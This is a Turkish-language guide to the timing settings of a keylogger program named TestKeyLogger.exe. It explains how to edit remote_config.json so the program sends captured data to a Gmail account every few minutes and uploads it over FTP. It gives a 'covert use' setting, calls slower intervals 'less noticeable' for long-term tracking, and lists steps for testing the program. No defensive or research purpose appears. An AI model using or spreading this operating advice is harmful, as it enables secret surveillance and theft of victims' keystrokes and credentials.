# ⏰ Zaman Ayarları Rehberi

## 🚀 Hızlı E-posta Gönderimi

### ✅ **Güncellenmiş Ayarlar:**
- **E-posta gönderim süresi**: 5 dakika (30 dakikadan kısaltıldı)
- **Daha hızlı takip**: Artık 5 dakikada bir e-posta alacaksınız

---

## ⏰ Zaman Seçenekleri

### **E-posta Gönderim Süreleri:**
```
1 dakika   - Çok hızlı (test için)
2 dakika   - Hızlı (gerçek zamanlı takip)
5 dakika   - Orta hızlı (önerilen) ✅
10 dakika  - Normal
15 dakika  - Yavaş
30 dakika  - Çok yavaş (varsayılan)
```

### **FTP Yükleme Süreleri:**
```
1 dakika   - Çok hızlı
5 dakika   - Hızlı
10 dakika  - Normal
15 dakika  - Yavaş (varsayılan)
```

---

## 🔧 Zaman Ayarlarını Değiştirme

### **remote_config.json Dosyasını Düzenleyin:**

#### **E-posta Gönderim Süresi:**
```json
{
  "EmailSettings": {
    "SendIntervalMinutes": 5
  }
}
```

#### **FTP Yükleme Süresi:**
```json
{
  "FtpSettings": {
    "UploadIntervalMinutes": 5
  }
}
```

### **Önerilen Ayarlar:**

#### **Test İçin (Hızlı):**
```json
{
  "EmailSettings": {
    "SendIntervalMinutes": 1
  }
}
```

#### **Normal Kullanım (Önerilen):**
```json
{
  "EmailSettings": {
    "SendIntervalMinutes": 5
  }
}
```

#### **Gizli Kullanım (Yavaş):**
```json
{
  "EmailSettings": {
    "SendIntervalMinutes": 15
  }
}
```

---

## 📊 Zaman Karşılaştırması

### **5 Dakika vs 30 Dakika:**
```
5 Dakika:
- Daha hızlı takip
- Daha fazla e-posta
- Daha iyi gerçek zamanlı izleme
- Test için ideal

30 Dakika:
- Daha az e-posta
- Daha az dikkat çekici
- Daha az trafik
- Uzun süreli takip için ideal
```

---

## ⚠️ Önemli Notlar

### **Gmail Limitleri:**
```
- Günlük e-posta limiti: 500 e-posta
- Saatlik limit: 100 e-posta
- 5 dakikada bir = günde 288 e-posta
- 1 dakikada bir = günde 1440 e-posta (limit aşılabilir!)
```

### **Öneriler:**
```
✅ 5 dakika - En iyi denge
✅ 2-3 dakika - Hızlı takip
❌ 1 dakika - Gmail limitini aşabilir
❌ 30 dakika - Çok yavaş
```

---

## 🧪 Test Süreleri

### **Test İçin Önerilen Süreler:**
```
İlk Test: 1 dakika (hızlı sonuç için)
Normal Test: 5 dakika (denge için)
Uzun Test: 10 dakika (stabilite için)
```

### **Test Adımları:**
```
1. remote_config.json dosyasını düzenleyin
2. TestKeyLogger.exe'yi çalıştırın
3. "🚀 Başlat" butonuna tıklayın
4. Belirlenen süre sonra e-posta gelip gelmediğini kontrol edin
5. Gerekirse süreyi ayarlayın
```

---

## 🎯 Sonuç

**✅ E-posta gönderim süresi 5 dakikaya kısaltıldı!**

- **Daha hızlı takip**: 5 dakikada bir e-posta
- **Daha iyi izleme**: Gerçek zamanlıya yakın
- **Test için ideal**: Hızlı sonuç alırsınız

**📧 Artık 5 dakikada bir e-posta alacaksınız!**
